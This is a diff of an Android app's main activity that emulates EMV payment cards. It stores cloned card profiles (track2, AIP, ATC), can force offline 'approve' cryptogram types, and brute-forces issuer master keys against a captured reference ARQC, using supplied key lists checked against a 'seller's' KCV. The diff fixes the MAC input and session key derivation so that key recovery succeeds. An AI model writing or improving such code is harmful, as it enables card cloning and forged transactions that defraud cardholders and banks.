@@ -70,18 +70,18 @@ public class MainActivity extends AppCompatActivity {
      */
     private static final String[] PROFILE_MASTERCARD = {
             "MASTERCARD", "A0000000041010", "1880",
-            "0110A000092400000102000000000000FF", "001C" };
+            "06010A03A00000", "001C" };
     private static final String[] PROFILE_VISA = {
             "VISA", "A0000000031010", "5800",
-            "0110A000032400000102000000000000FF", "001C" };
+            "06010A03A00000", "001C" };
 
     private static final String ASKED_DEFAULT = "asked_default";
 
     private static final String[][] VARIANTS = {
-            {"0", "CDOL, AIP, ATC  -  option 0"},
-            {"1", "CDOL, AIP, ATC  -  option 1"},
-            {"2", "AIP, ATC, CDOL  -  option 0"},
-            {"3", "AIP, ATC, CDOL  -  option 1"},
+            {"0", "CDOL, AIP, ATC, IAD  -  option 0"},
+            {"1", "CDOL, AIP, ATC, IAD  -  option 1"},
+            {"2", "AIP, ATC, IAD, CDOL  -  option 0"},
+            {"3", "AIP, ATC, IAD, CDOL  -  option 1"},
     };
 
     private static final String[][] AID_PRESETS = {
@@ -713,7 +713,7 @@ public class MainActivity extends AppCompatActivity {
         etDiscretionary.setText(prefs.getString(key(i, "discretionary"), ""));
         etTrack2.setText(prefs.getString(key(i, "track2"), ""));
         etAid.setText(prefs.getString(key(i, "aid"), ""));
-        etAip.setText(prefs.getString(key(i, "aip"), "5800"));
+        etAip.setText(prefs.getString(key(i, "aip"), "1880"));
         etAfl.setText(prefs.getString(key(i, "afl"), ""));
         etCid.setText(prefs.getString(key(i, "cid"), ""));
         etAtc.setText(prefs.getString(key(i, "atc"), "001B"));
@@ -801,6 +801,10 @@ public class MainActivity extends AppCompatActivity {
                 .append(aid.isEmpty() ? "(EMPTY - profile default is used)" : aid).append('\n');
         sb.append("AIP  (82)  : ")
                 .append(t(etAip).isEmpty() ? "1880" : t(etAip).toUpperCase()).append('\n');
+        sb.append("IAD  (9F10): ")
+                .append(t(etIad).isEmpty() ? "(empty - CVN unreadable, CSK assumed)"
+                        : t(etIad).toUpperCase() + "  CVN " + cvnFromIad(t(etIad)))
+                .append('\n');
         sb.append("CID        : ")
                 .append(t(etCid).isEmpty() ? "40 from the profile - TC, approve offline"
                         : t(etCid).toUpperCase() + "  (FORCED)").append('\n');
@@ -1013,7 +1017,7 @@ public class MainActivity extends AppCompatActivity {
             return;
         }
         try {
-            status("KCV " + EmvCrypto.kcv(k) + "  (compare with the seller's)");
+            status("KCV " + EmvCrypto.kcv(hexToBytes(k)) + "  (compare with the seller's)");
         } catch (Exception e) {
             status("KCV failed - " + e);
         }
@@ -1032,14 +1036,36 @@ public class MainActivity extends AppCompatActivity {
                 .show();
     }
 
+    /**
+     * Candidates for the scan.
+     *
+     * A remembered key for this BIN comes first. When a supplied list exists it
+     * is used ALONE: generated families cannot match a production IMK, so
+     * merging them only spends hundreds of thousands of MACs on keys that are
+     * known not to work. Generation is the fallback for an empty list.
+     */
     private List<String> candidateKeys() {
-        List<String> out = new ArrayList<>(
-                KeyFinder.candidates(digits(t(etPan)), prefs.getString("keylist", "")));
-
         String bin = digits(t(etPan));
+        List<String> out = new ArrayList<>();
+
         if (bin.length() >= 6) {
             String remembered = prefs.getString("keyfor_" + bin.substring(0, 6), "");
             if (remembered.length() == 32 && !out.contains(remembered)) out.add(0, remembered);
+        }
+
+        List<String> supplied = new ArrayList<>();
+        for (String line : prefs.getString("keylist", "").split("\\R")) {
+            String k = line.replaceAll("[^0-9A-Fa-f]", "").toUpperCase();
+            if (k.length() == 32 && !supplied.contains(k)) supplied.add(k);
+        }
+
+        if (!supplied.isEmpty()) {
+            for (String k : supplied) if (!out.contains(k)) out.add(k);
+            return out;
+        }
+
+        for (String k : KeyFinder.candidates(bin, "")) {
+            if (!out.contains(k)) out.add(k);
         }
         return out;
     }
@@ -1068,8 +1094,12 @@ public class MainActivity extends AppCompatActivity {
      * into the boxes. The typed route uses the REFERENCE card's AIP, not ours:
      * the reference ARQC was MACed over that AIP, so 1880 can never match.
      *
-     * The session key scheme follows the CVN in the IAD: 16/17 are SKD, 20/21
-     * are CSK. Using the wrong one produces a wrong ARQC from a right key.
+     * The MAC input is cdol || AIP || ATC || IAD. The IAD is in there because
+     * it carries the CVN; without it every candidate is judged over too few
+     * bytes and a right key looks wrong.
+     *
+     * The session key scheme follows the CVN: 16/17 are SKD with the UN,
+     * 20/21 are CSK. Using the wrong one produces a wrong ARQC from a right key.
      */
     private void scanForKey(boolean announce) {
         String cmdHex = prefs.getString(key(current, "cap_genaccmd"), "");
@@ -1138,6 +1168,7 @@ public class MainActivity extends AppCompatActivity {
         }
 
         final byte[] aip = hexToBytes(aipHex);
+        final byte[] iadRef = hexToBytes(t(etIad));
         final String psn = prefs.getString(key(current, "psn"), "01");
         final List<String> keys = candidateKeys();
 
@@ -1161,14 +1192,19 @@ public class MainActivity extends AppCompatActivity {
                     tried++;
                     try {
                         byte[] macIn = ((variant & 2) != 0)
-                                ? cat(aip, hexToBytes(atc), cdol)
-                                : cat(cdol, aip, hexToBytes(atc));
+                                ? cat(aip, hexToBytes(atc), iadRef, cdol)
+                                : cat(cdol, aip, hexToBytes(atc), iadRef);
                         byte[] un = cdol.length < 4
                                 ? new byte[4]
                                 : Arrays.copyOfRange(cdol, cdol.length - 4, cdol.length);
-                        byte[] ac = csk
-                                ? EmvCrypto.arqc(k, pan, psn, atc, macIn, variant & 1)
-                                : EmvCrypto.arqcSkd(k, pan, psn, atc, un, macIn, variant & 1);
+
+                        byte[] mk = hexToBytes(k);
+                        byte[] sk = csk
+                                ? EmvCrypto.sessionKeyCsk(EmvCrypto.cardKey(mk, pan, psn),
+                                        hexToBytes(atc))
+                                : EmvCrypto.sessionKeySkd(mk, hexToBytes(atc), un);
+                        byte[] ac = EmvCrypto.arqc(sk, macIn);
+
                         if (Arrays.equals(ac, arqcRef)) {
                             final String fk = k;
                             final int fv = variant;
